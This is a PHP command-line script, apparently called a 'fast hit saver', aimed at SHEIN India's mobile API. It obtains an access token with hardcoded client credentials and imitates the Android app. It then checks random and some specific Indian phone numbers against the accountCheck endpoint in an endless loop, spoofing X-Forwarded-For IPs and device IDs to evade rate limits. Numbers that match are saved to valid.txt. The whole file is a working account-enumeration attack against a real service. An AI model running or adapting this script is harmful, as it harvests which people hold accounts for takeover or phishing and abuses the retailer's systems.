<?php
// ---------------------------------------------------------
// SHEIN INDIA FAST HIT SAVER
// ---------------------------------------------------------
error_reporting(0);
ini_set('memory_limit', '128M');

// Colors
$green  = "\033[1;32m";
$red    = "\033[1;31m";
$cyan   = "\033[1;36m";
$yellow = "\033[1;33m";
$reset  = "\033[0m";

echo $cyan . "
   _____ __  __ ______ _____ _   _
  / ____|  \/  |  ____|_   _| \ | |
 | (___ | \  / | |__    | | |  \| |
  \___ \| |\/| |  __|   | | | . ` |
  ____) | |  | | |____ _| |_| |\  |
 |_____/|_|  |_|______|_____|_| \_|
       FAST HIT & SAVE v4
" . $reset . PHP_EOL;


// ---------------------------------------------------------
// UTILS
// ---------------------------------------------------------

function randIp()
{
    return rand(11, 199) . "." .
           rand(10, 250) . "." .
           rand(10, 250) . "." .
           rand(1, 250);
}

function genDeviceId()
{
    return bin2hex(random_bytes(8));
}

function generateIndianMobile()
{
    $prefixes = ['99','98','97','96','93','90','88','89','87','70','79','78','63','62'];
    return $prefixes[array_rand($prefixes)] . rand(10000000, 99999999);
}

function httpCall($url, $data = null, $headers = [], $method = "GET")
{
    $ch = curl_init();

    $options = [
        CURLOPT_URL            => $url,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING       => 'gzip',
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT        => 5,
    ];

    if ($method === "POST") {
        $options[CURLOPT_POST]       = true;
        $options[CURLOPT_POSTFIELDS] = $data;
    }

    curl_setopt_array($ch, $options);

    $output   = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return [
        'body' => $output,
        'code' => $httpCode
    ];
}


// ---------------------------------------------------------
// CORE FUNCTIONS
// ---------------------------------------------------------

function getClientToken()
{
    $url  = "https://api.services.sheinindia.in/uaas/jwt/token/client";

    $adId = genDeviceId();
    $ip   = randIp();

    $headers = [
        "Accept: application/json",
        "Accept-Encoding: gzip",
        "Accept-Language: en-IN,en;q=0.9",
        "Connection: Keep-Alive",

        // Android App User-Agent
        "User-Agent: SHEIN/1.0.8 (Linux; Android 11; SM-G991B Build/RP1A.200720.012)",

        // Client info (same style as accountCheck)
        "Client_type: Android/30",
        "Client_version: 1.0.8",

        // Tenant
        "X-Tenant: B2C",
        "X-Tenant-Id: SHEIN",

        // Device
        "Ad_id: $adId",

        // Network
        "X-Forwarded-For: $ip",

        "Content-Type: application/x-www-form-urlencoded"
    ];

    $data = http_build_query([
        "grantType"     => "client_credentials",
        "clientName"    => "trusted_client",
        "clientSecret"  => "secret"
    ]);

    $response = httpCall($url, $data, $headers, "POST");
    $json     = json_decode($response['body'], true);

    return $json['access_token'] ?? null;
}

// ---------------------------------------------------------
// MAIN LOOP
// ---------------------------------------------------------

$count = 0;
$hits  = 0;

echo $yellow . "[i] Generating Token..." . $reset . PHP_EOL;

$token = getClientToken();

if (!$token) {
    die($red . "Failed to generate initial Token." . $reset . PHP_EOL);
}

echo $green . "[+] Speed Check Started! Hits will be saved to valid.txt" . $reset . PHP_EOL;

while (true) {

    $count++;

    // Refresh token every 50 checks
    if ($count % 50 == 0) {
        $newToken = getClientToken();
        if ($newToken) {
            $token = $newToken;
        }
    }

    // Target logic
    if ($count == 2) {
        $mobile = "6272882661";
    } elseif ($count == 4) {
        $mobile = "90682821398";
    } else {
        $mobile = generateIndianMobile();
    }

    $adId = genDeviceId();
    $ip   = randIp();

    // -------------------------------------------------
    // CHECK
    // -------------------------------------------------

    $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";

    $headers = [
        "Authorization: Bearer $token",
        "Accept: application/json",
        "Accept-Encoding: gzip",
        "Accept-Language: en-IN,en;q=0.9",
        "Connection: Keep-Alive",

        "User-Agent: SHEIN/1.0.8 (Linux; Android 11; SM-G991B Build/RP1A.200720.012)",

        "Client_type: Android/30",
        "Client_version: 1.0.8",

        "Requestid: account_check",
        "X-Tenant: B2C",
        "X-Tenant-Id: SHEIN",

        "Ad_id: $adId",
        "X-Forwarded-For: $ip",

        "Content-Type: application/x-www-form-urlencoded"
    ];

    $data = "mobileNumber=$mobile";

    $res  = httpCall($url, $data, $headers, "POST");
    $json = json_decode($res['body'], true);

    // -------------------------------------------------
    // RESULT
    // -------------------------------------------------

    if (isset($json['encryptedId']) && !empty($json['encryptedId'])) {

        $hits++;
        $encId = $json['encryptedId'];

        echo $green . "[HIT] $mobile | ID: " .
             substr($encId, 0, 10) . "..." .
             $reset . PHP_EOL;

        echo $cyan . "      -> Saved to valid.txt" . $reset . PHP_EOL;

        $timestamp = date("Y-m-d H:i:s");
        $saveData  = "$mobile | $encId | $timestamp" . PHP_EOL;

        file_put_contents("valid.txt", $saveData, FILE_APPEND);

    } else {

        if ($res['code'] == 429) {

            echo $yellow . "[!] Rate Limit (429) - Pausing .01s..." . $reset . PHP_EOL;
            sleep(0.04);

        } elseif ($res['code'] == 401 || $res['code'] == 403) {

            $token = getClientToken();

        } else {

            echo $red . "[BAD] $mobile" . $reset . PHP_EOL;
        }
    }

    usleep(300000);
}
